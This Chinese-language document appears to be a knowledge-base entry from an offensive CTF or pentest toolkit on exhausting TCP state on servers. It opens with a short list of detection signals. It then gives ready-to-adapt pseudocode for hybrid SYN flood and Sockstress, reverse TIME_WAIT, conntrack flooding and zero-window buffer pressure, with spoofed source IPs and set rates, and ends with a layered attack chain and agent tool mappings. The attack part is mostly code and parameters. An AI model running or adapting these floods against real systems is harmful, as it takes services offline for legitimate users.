# TCP 协议栈状态耗尽

## 场景

TCP 是有状态协议，每次握手/连接都在内核中分配数据结构。攻击者利用 TCP 状态机的特性，以极小代价消耗内核的 socket buffer、connection table 或 TIME_WAIT 槽位，使服务器无法接受新连接。

```
攻击面:
  - SYN queue (半连接队列)
  - Accept queue (全连接队列)  
  - Connection table (全局连接跟踪表)
  - TIME_WAIT slots
  - Socket buffer memory
  - netfilter/conntrack 表项
```

## 输入信号

- `/proc/net/sockstat` 中 `TCP: inuse` 接近或超过 `tcp_max_orphans`，`TIME_WAIT` 条目 > 50000
- `ss -s` 显示 `timewait` 或 `syn-recv` 数量异常 (正常 < 1000, 攻击时 > 50000)
- 半连接队列溢出计数器递增: `netstat -s | grep "SYNs to LISTEN"`
- `nf_conntrack_count` 接近 `nf_conntrack_max` → 新连接被 `nf_conntrack: table full` 丢弃
- 内核日志 `dmesg` 出现 `TCP: Possible SYN flooding on port 443` 或 `Dropping request`
- 合法用户连接被 `Connection refused` 或 `Connection timeout`，但服务器本身无 CPU 升高
- `netstat -ant` 中大量 `SYN_RECV` / `TIME_WAIT` / `CLOSE_WAIT` 状态连接
- SYN Cookie 被激活 (正常不应触发)，`/proc/sys/net/ipv4/tcp_syncookies` 统计递增

---

## 方法 1: SYN Flood 及现代变种

### 经典 SYN Flood

```
攻击者 → TCP SYN (伪造源 IP) → 服务器
服务器 → TCP SYN-ACK → 伪造 IP (无响应)
服务器 → SYN_RCVD 状态, 重传 SYN-ACK 最多 5 次
       半连接队列槽位被占 → 队列满 → 新 SYN 被丢弃

带宽: 每 SYN 约 60 bytes
100 Mbps → 约 200,000 SYN/s
默认半连接队列: /proc/sys/net/ipv4/tcp_max_syn_backlog = 512 (旧)/4096 (新)
```

### SYN Cookie 绕过 — Sockstress

```
SYN Cookie 解决了半连接队列耗尽，但 Sockstress 攻击全连接:

攻击者完成三次握手 (真实 IP)
→ 进入 ESTABLISHED 状态
→ 设置极小的 TCP window (0 或 1 byte)
→ 服务器不能发送数据 (等待 window update)
→ 连接永久占用 accept queue 槽 + socket buffer

持久性: 单连接可维持数小时 (TCP keepalive 默认 2 小时)
```

### 伪代码: SYN Flood + 真实 IP 混合

```
function syn_flood_hybrid(target, port=443, syn_rate=50000, 
                          legit_rate=1000, duration_sec=120):
    raw_sock = create_raw_socket()
    tcp_socks = []
    
    # 并行执行
    parallel:
        # 线程1: 伪造 SYN flood (消耗半连接队列)
        thread:
            deadline = now() + duration_sec
            while now() < deadline:
                for batch in 1..(syn_rate / 100):
                    src_ip = random_public_ip()
                    syn_pkt = build_syn_packet(
                        src_ip=src_ip, dst=target, dst_port=port,
                        seq=random_u32(),
                        window=65535,
                        options=[MSS(1460), SACK_OK, TIMESTAMP]
                    )
                    raw_sock.send(syn_pkt)
                sleep(0.01)  # 控制速率
        
        # 线程2: 真实连接占满 accept queue
        thread:
            for i in 0..(legit_rate * duration_sec):
                sock = tcp_connect(target, port)
                # 三次握手完成
                # 但立刻将接收窗口设为 0
                sock.setsockopt(SO_RCVBUF, 0)
                # 不发任何数据，不发 FIN
                tcp_socks.append(sock)
                sleep(1 / legit_rate)
    
    # 攻击效果
    # 半连接队列 + 全连接队列 双满
    # 新连接无法建立
```

## 方法 2: TIME_WAIT 耗尽

### 原理

每次 TCP 连接关闭时，主动关闭方进入 TIME_WAIT 状态 (默认 60-120 秒)。期间该四元组 (src_ip, src_port, dst_ip, dst_port) 不可重用。攻击者从真实 IP 主动发起并主动关闭大量连接，耗尽本地端口或对端 TIME_WAIT 槽。

```
攻击者机器:
  可用源端口: 65535 - 1024 = 64511
  TIME_WAIT 持续时间: 60 秒 (Linux net.ipv4.tcp_fin_timeout)
  
  最大出连接速率: 64511 / 60s ≈ 1075 conn/s
  → 超过此速率 → 本地端口耗尽 → 攻击者自己不能建新连接
  
  解决方案: 使用多源 IP 或多攻击机
```

### 反向 TIME_WAIT 攻击

```
攻击者为服务器制造大量 TIME_WAIT 连接:

  攻击者 ↔ 服务器: 建立连接 → 短暂交换 → 攻击者主动 FIN
  → 服务器的连接进入 TIME_WAIT
  → 每个 TIME_WAIT 占用约 200 bytes 内存 + conntrack 条目
  → 大量 TIME_WAIT → 内存压力 + conntrack 表满
  → conntrack 满 → 新连接被 netfilter 丢弃
```

### 伪代码

```
function reverse_timewait_attack(target, port=80, rate=5000, duration=120):
    # 快速建立-关闭连接，使服务器积累 TIME_WAIT
    for i in 0 .. (rate * duration):
        sock = tcp_connect(target, port)
        sock.send("GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n")
        # 不等完整响应
        sock.shutdown(SHUT_WR)  # 发起 FIN
        sock.close()  # 本地进入 TIME_WAIT 但马上重用 socket
        
        if i % 1000 == 0:
            server_tw = ssh_exec(target, 
                "ss -tan state time-wait | wc -l")
            print("[*] Server TIME_WAIT: {server_tw}")
```

## 方法 3: Conntrack 表耗尽

### 原理

Linux netfilter 的 conntrack 表跟踪所有连接。攻击者发送大量短连接或无效包，消耗 conntrack 条目。

```
conntrack 默认值:
  /proc/sys/net/netfilter/nf_conntrack_max: 65536 (典型)
  每项内存: ~300 bytes
  总内存: ~20 MB (不大，但连接跟踪能力有限)
  
攻击: 65536 个条目后，新连接被丢弃或不经 NAT
```

### 伪代码: Conntrack 洪泛

```
function conntrack_exhaust(target, rate=10000, duration=120):
    # 方法1: 大量短连接
    for i in 0 .. (rate * duration):
        # 每个连接创建新 conntrack 条目
        sock = tcp_connect(target, random_port(1, 65535))
        sock.close()
    
    # 方法2: 伪造包触发 conntrack 创建
    # 即使目标端口关闭，conntrack 仍记录该"连接尝试"
    raw = create_raw_socket()
    for i in 0 .. (rate * duration * 10):
        src_ip = random_public_ip()
        src_port = random_port(1024, 65535)
        dst_port = random_port(1, 65535)
        
        syn = build_syn_packet(src_ip, src_port, target, dst_port)
        raw.send(syn)
    
    # 效果: conntrack 表满 → 
    #   NAT 不能创建新条目 → 内网不能访问外网
    #   防火墙可能 drop 所有新连接
```

## 方法 4: TCP Fast Open 滥用

### 原理

TFO (TCP Fast Open) 允许在 SYN 中携带数据。攻击者滥用此特性进行放大或状态耗尽：

```
1. TFO Cookie 请求风暴:
   攻击者发送大量带 TFO 选项的 SYN
   服务器为每个生成 cookie (需密钥 + HMAC 计算)
   → CPU 消耗

2. TFO 反射放大:
   攻击者伪造源 IP 发送 TFO SYN + 数据
   服务器响应 SYN-ACK + 数据 (比攻击者发送的更大)
   → 类似 UDP 放大

3. TFO 数据累积:
   发送带大量数据的 TFO SYN
   即使三次握手未完成，服务器已经分配 buffer 接收数据
```

## 方法 5: Socket Buffer 内存压力

### 原理

每个 TCP 连接分配读写缓冲区。攻击者发送数据但不确认 (zero window)，迫使服务器缓冲数据：

```
攻击:
  建立连接 → 服务器发送响应 → 攻击者通告 zero window
  → 服务器数据堆积在 send buffer
  → 每个连接可占用 tcp_wmem 默认最大 4MB (Linux)
  → 100 个连接 ≈ 400MB 内存
  → 1000 个连接 ≈ 4GB → 触发 OOM
```

### 伪代码

```
function tcp_buffer_pressure(target, port=80, connections=500):
    socks = []
    
    for i in 0 .. connections:
        sock = tcp_connect(target, port)
        # 请求一个大资源
        sock.send("GET /large-file HTTP/1.1\r\nHost: {target}\r\n\r\n")
        
        # 读取响应头但不读 body
        # 或者通告 zero window
        sock.setsockopt(SO_RCVBUF, 0)  # 通告 win=0
        
        socks.append(sock)
    
    # 服务器每个连接 send buffer 堆积数据
    # 内存持续增长直到 OOM 或 TCP 超时 (默认 15 分钟)
    
    # 保持连接存活
    while True:
        for sock in socks[::50]:  # 每 50 个发 1 次探活
            try:
                sock.send(b"\x00")  # TCP keep-alive probe
            except:
                pass
        sleep(30)
```

## 攻击链

```
发现:
  1. nmap 扫描 TCP 开放端口
  2. 确认 conntrack 限制 (通过逐渐增加连接数检测)
  3. 确认 TIME_WAIT 配置 (FIN 后测量 TIME_WAIT 恢复时间)

攻击:
  4. SYN flood + Sockstress 混合 → 半连接 + 全连接双满
  5. 叠加 conntrack 洪泛 → 绕过 syn cookie 的限制
  6. 叠加 buffer pressure → 消耗剩余内存
```

## 参考资料

1. CVE-1999-0116 — Classic SYN flood (first documented)
2. CVE-2011-1473 — OpenSSL renegotiation DoS (related TLS attack)
3. RFC 4987 — TCP SYN Flooding Attacks and Common Mitigations
4. BCP38 / RFC 2827 — Network Ingress Filtering
5. "Sockstress" — Outpost24, 2008 (TCP window zero attack)
6. CVE-2022-32293 — TCP Middlebox Reflection (AWS NLB / F5 BIG-IP)
7. RFC 7413 — TCP Fast Open
8. "net.ipv4.tcp_syncookies" — Linux kernel SYN cookie documentation
9. "conntrack: table full" — Linux netfilter troubleshooting guide
10. "A study of Slow-rate DoS Attacks against Network Services" — Maciá-Fernández et al., 2010

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| 端口探测 | `http_probe` | 探测 TCP 开放端口及服务 |
| 技术搜索 | `kb_router` | 搜索 syn_flood / sockstress / tcp_dos |
| 技术查阅 | `kb_read_file` | 读取本文件及 01-application-layer-dos |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
